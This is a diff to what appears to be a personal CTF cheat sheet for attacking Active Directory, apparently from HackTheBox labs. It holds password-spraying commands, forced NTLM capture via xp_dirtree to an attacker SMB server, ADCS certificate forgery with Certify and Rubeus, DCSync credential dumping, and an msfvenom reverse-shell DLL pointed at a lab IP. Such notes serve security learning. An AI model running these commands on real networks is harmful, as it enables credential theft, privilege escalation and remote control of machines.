@@ -78,6 +78,17 @@ crackmapexec ldap <hostname> -u <username> -p <password> --users # Enumerate use
 crackmapexec ldap <hostname> -u <username> -p <password> --domains # Enumerate domains
 crackmapexec ldap <hostname> -u <username> -p <password> --search '(&(objectClass=user)(sAMAccountName=*administrator*))' # Enumerate specific atr
 ````
+### Netexec for ldap
+---
+Netexec is a post-exploitation tool used to execute commands on remote machines via various network protocols, such as SMB, LDAP, and ADCS. It allows attackers to interact with Active Directory and related services, automate tasks, and perform enumeration or exploitation of vulnerable configurations in the network.
+
+````bash
+netexec ldap <target-ip> -u <user> -p <password> --module enumdc # Enumerate Domain Controllers
+netexec ldap <target-ip> -u <user> -p <password> --module enumusers # Search for users
+netexec ldap <target-ip> -u <user> -p <password> --module adcs # Check for misconfigurations in ADCS
+netexec ldap <target-ip> -u <user> -p <password> --module ldapbind # Search for bindings
+netexec ldap <target-ip> -u <user> -p <password> --module enumgroups # Search for groups
+````
 
 ## ENUMERATING TLS
 ---
@@ -87,14 +98,27 @@ TLS encrypts communication between the client and server, ensuring security. It 
 openssl s_client -showcerts -connect 10.10.11.202:3269 | openssl x509 -noout -text
 ````
 
+## ENUMERATING MSSQL
+MSSQL (Microsoft SQL Server):** MSSQL is a relational database management system (RDBMS) developed by Microsoft. It is widely used in enterprise environments to store and manage large amounts of data, supporting complex queries, transactions, and data integrity.
+
+### Impacket-mssqclient
+---
+Impacket-mssqlclient is a tool from the Impacket suite, which provides scripts and utilities to interact with various network protocols in Windows environments. `mssqlclient` allows us to connect to an MSSQL server using the obtained credentials, enabling actions like executing SQL queries, exploiting SQL injection vulnerabilities, or accessing sensitive data stored in the database.
+
+````bash
+impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
+````
 ## VULNERABILITIES
 ---
-### PASSWORD SPRYING WITH CRACKMAPEXEC
+### Password sprying
 ---
 **Password spraying** is a brute-force attack method where an attacker attempts to log in to multiple accounts using the same common password (e.g., "Welcome123!"). Unlike traditional brute force, which targets one account with many passwords, password spraying avoids account lockouts by testing a single password across many different accounts.
 
 ````bash
-crackmapexec smb 10.10.10.169 -u users.txt -p 'password.txt' --continue-on-success
+crackmapexec smb 10.10.10.169 -u users.txt -p password.txt --continue-on-success
+netexec ldap <target-ip> -u users.txt -p password.txt --continue-on-succes
+netexec smb <target-ip> -u users.txt -p password.txt --continue-on-succes
+netexec winrm <target-ip> -u users.txt -p password.txt --continue-on-succes
 ````
 
 ### Kerberos pre-authentication vulnerability
@@ -135,7 +159,7 @@ kerbrute userenum -d DOMAIN -i users.txt
 impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
 ````
 
-#### DC-SYNC
+### DC-SYNC
 ---
 A **DCSync attack** is a method used to simulate the behavior of a Domain Controller (DC) in order to retrieve password hashes of domain accounts from Active Directory. This attack exploits the replication protocol used by domain controllers to synchronize directory data. By performing a DCSync attack, an attacker can request the password hashes (or even clear-text passwords, if applicable) for specific accounts without needing direct access to the DC.
 
@@ -149,6 +173,40 @@ You will need one of the following requirements, usually printed on **BLOODHOUND
 ./secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 # Dump credentials (if we have acces to them)
 ````
 
+### Man in the middle
+---
+A Man-in-the-Middle (MITM) attack in the context of Active Directory (AD) involves intercepting and potentially altering communication between a client (e.g., a user or service) and a domain controller (DC). This can occur when an attacker is positioned between the client and DC, allowing them to capture authentication traffic, modify requests, or inject malicious data
+
+#### MITM with mssql
+---
+
+Once we re inside the MSSQL we can try to force a conexion with our smbserver to try catching its hash NTLMv2
+
+````bash
+impacket-smbserver share /tmp/share -ip 10.10.14.9 -smb2support # Create your smbserver
+EXEC xp_dirtree '\\10.10.14.9\share', 1, 1 # Make the msql connect to the smbserver
+````
+### Active Directory Certificate Services (ADCS)
+---
+
+This vulnerability arises when the Active Directory Certificate Services (ADCS) are improperly configured. In such cases, attackers can potentially request and obtain certificates from the enterprise CA without proper authorization. These misconfigurations can allow an attacker to enroll for certificates that grant elevated privileges or enable impersonation of legitimate users. By exploiting this weakness, an attacker could escalate privileges or move laterally within the network.
+
+#### Certify.exe
+---
+With <a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/Certify.exer" target="_blank">Certify.exe</a>, we can test if the victim machine’s ADCS setup is susceptible to unauthorized certificate enrollment and assess the associated risks
+
+````powershell
+.\Certify.exe find /vulnerable /currentuser # Confirm if its vulnerable
+.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator # Make a fake certificate
+````
+#### Rubeus.exe
+---
+<a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/Rubeus.exe" target="_blank">Rubeus.exe</a> a powerful tool for interacting with Kerberos tickets in Windows environments. In this context, we will use it to request a **Ticket Granting Ticket (TGT)** using the certificate we obtained and in this case we also get the hash NTLM.
+
+````powershell
+.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show /nowrap
+````
+
 ##  ABUSE OF PRIVILEGES
 ---
 ### Enumerating privileges
@@ -159,7 +217,7 @@ You will need one of the following requirements, usually printed on **BLOODHOUND
 whoami -all
 whoami -groups
 ````
-#### Bloodhound
+#### Bloodhound for enumerating privileges
 ---
 BloodHound is a tool for Active Directory auditing that helps map trust relationships, permissions, and privilege escalation paths within a domain. It visually identifies attack vectors by showing how an attacker could escalate privileges or move laterally within a network.
 
@@ -171,7 +229,7 @@ bloodhound-python -c All -u P.Rosa -p 'Rosaisbest123' -d vintage.htb -ns 10.10.1
 
 If we can acces with WinRM: SharpHound >
 
-#### SharpHound
+#### SharpHound for enumerating privileges
 ---
 SharpHound is the data collection tool used by BloodHound. It scans the Active Directory environment to gather information about users, groups, permissions, and trust relationships. The data collected is then analyzed by BloodHound.
 
@@ -180,9 +238,9 @@ We use <a href="https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.0" t
 
 **DISCLAIMER**: If you are using **BloodHound** installed from Kali's APT repository, you will need to run **SharpHound v1.1.0**. Otherwise, your data will not load properly.
 
-## PRIVILEGED AD GROUP ABUSE
+### Privileged AD Group Abuse
 ---
-### AD-Recycle Bin
+#### AD-Recycle Bin
 ---
 The **AD Recycle Bin** is a feature in Active Directory that allows the recovery of deleted objects, such as users, groups, or computers, without requiring backups. Being part of this group, we can potentially enumerate and extract information from deleted objects in the domain.
 
@@ -193,7 +251,7 @@ Get-ADObject -ldapfilter "(&(ObjectClass=user)(DisplayName=TempAdmin)(isDeleted=
 Restore-ADObject -Identity <ObjectGUID> # Restore objects
 ````
 
-### Dns-Admins
+#### Dns-Admins
 ---
  **DnsAdmins** group consists of users who have special permissions to manage and configure DNS settings on a Windows machine. Members of this group typically have the ability to create, modify, and delete DNS records in Active Directory-integrated zones. By default, this group does not have permission to start or stop the DNS service, but administrators can assign additional privileges to members, which may include the ability to control the DNS service.
 
@@ -205,7 +263,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f dll -o 
 
 Next steps explianed <a href="https://whare1.github.io/posts/Resolute-Writeup/" target="_blank">on resolute writeup</a>
 
-### LAPS_Readers
+#### LAPS_Readers
 ---
 **LAPS_Readers** is a built-in group in Active Directory, specifically for **Local Administrator Password Solution (LAPS)**. Members of this group have **read-only access** to the local administrator passwords of managed machines in the domain. These passwords are automatically generated and stored securely in Active Directory by LAPS.
 
